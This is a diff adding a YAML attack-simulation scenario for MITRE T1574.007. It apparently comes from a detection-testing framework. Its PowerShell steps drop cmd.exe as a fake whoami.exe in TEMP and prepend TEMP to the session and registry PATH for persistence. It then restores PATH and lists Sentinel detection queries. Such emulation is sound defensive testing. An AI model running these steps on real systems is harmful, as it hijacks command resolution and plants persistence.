@@ -1,0 +1,102 @@
+id: T1574.007_path_interception_path_env_var
+name: "Hijack Execution Flow — Path Interception by PATH Environment Variable"
+mitre_technique: "T1574.007"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries prepend a writable directory to the PATH environment variable, then
+  drop a binary with the same name as a commonly-called executable (e.g. python.exe,
+  git.exe, whoami.exe). When that executable is invoked without a full path, the OS
+  finds the adversary's binary first. This is persistent if the PATH modification
+  is written to the user or system environment, and transient if set only in the
+  current session.
+  This scenario prepends TEMP to PATH and drops a benign marker binary as whoami.exe,
+  validates it would be found first, then cleans up.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1574/007/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1574.007 — PATH Environment Variable Interception simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Prepend TEMP to PATH and drop a trojanised whoami.exe"
+    command: |
+      $fakeBin = "$env:TEMP\whoami.exe"
+      Copy-Item "$env:SystemRoot\System32\cmd.exe" $fakeBin -Force
+      Write-Host "[PAS] Dropped fake whoami.exe at: $fakeBin"
+
+      # Prepend TEMP to current-session PATH
+      $origPath  = $env:PATH
+      $env:PATH  = "$env:TEMP;$origPath"
+      Write-Host "[PAS] PATH prepended with: $env:TEMP"
+      Write-Host "[PAS] PATH is now: $($env:PATH.Split(';') | Select-Object -First 5) ..."
+
+  - step: 3
+    type: exec_powershell
+    description: "Verify the hijacked binary would be resolved first"
+    command: |
+      Write-Host "[PAS] Resolving 'whoami' via PATH:"
+      $resolved = (Get-Command whoami -ErrorAction SilentlyContinue).Source
+      Write-Host "  Resolved to: $resolved"
+      if ($resolved -like "*Temp*") {
+          Write-Host "  [PAS] PATH HIJACK WOULD SUCCEED — TEMP binary found before System32"
+      } else {
+          Write-Host "  [PAS] System32 binary resolved first — PATH hijack did not take effect in this session"
+      }
+
+  - step: 4
+    type: exec_powershell
+    description: "Persist PATH modification to user environment registry — simulates adversary persistence"
+    command: |
+      $regPath  = "HKCU:\Environment"
+      $origUserPath = (Get-ItemProperty $regPath -Name PATH -ErrorAction SilentlyContinue).PATH
+      $newPath  = "$env:TEMP;$origUserPath"
+      Set-ItemProperty $regPath -Name "PAS_T1574_007_PATH_BACKUP" -Value "$origUserPath" -Force
+      Set-ItemProperty $regPath -Name "PATH" -Value $newPath -Force
+      Write-Host "[PAS] User PATH registry written: HKCU:\Environment\PATH prepended with TEMP"
+      Write-Host "[PAS] This persists across logons until reversed"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — HKCU\Environment\PATH registry write and fake binary in TEMP"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Restore user PATH and remove fake binary"
+    command: |
+      $regPath = "HKCU:\Environment"
+      $backup  = (Get-ItemProperty $regPath -Name "PAS_T1574_007_PATH_BACKUP" -ErrorAction SilentlyContinue).PAS_T1574_007_PATH_BACKUP
+      if ($backup) {
+          Set-ItemProperty $regPath -Name "PATH" -Value $backup -Force
+          Remove-ItemProperty $regPath -Name "PAS_T1574_007_PATH_BACKUP" -Force
+          Write-Host "[PAS][Cleanup] User PATH restored"
+      }
+      Remove-Item "$env:TEMP\whoami.exe" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Fake binary removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1574.007 cleanup complete — PATH restored and fake binary removed"
+
+analyst_checklist:
+  - "Registry event: HKCU\Environment\PATH modified — user-level PATH change is a persistence indicator"
+  - "File event: executable dropped in TEMP with same name as system binary (whoami.exe, cmd.exe, etc.)"
+  - "Process event: whoami.exe executing from TEMP rather than System32"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'Environment' and RegistryValueName == 'PATH' and InitiatingProcessFileName == 'powershell.exe'"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'whoami.exe' and FolderPath !contains 'System32'"
+  - "CONTROL CHECK: Monitor HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment and HKCU\Environment for PATH changes"
+  - "CONTROL CHECK: Alert on any system-named binary (cmd.exe, whoami.exe, net.exe) executing from non-System32 path"
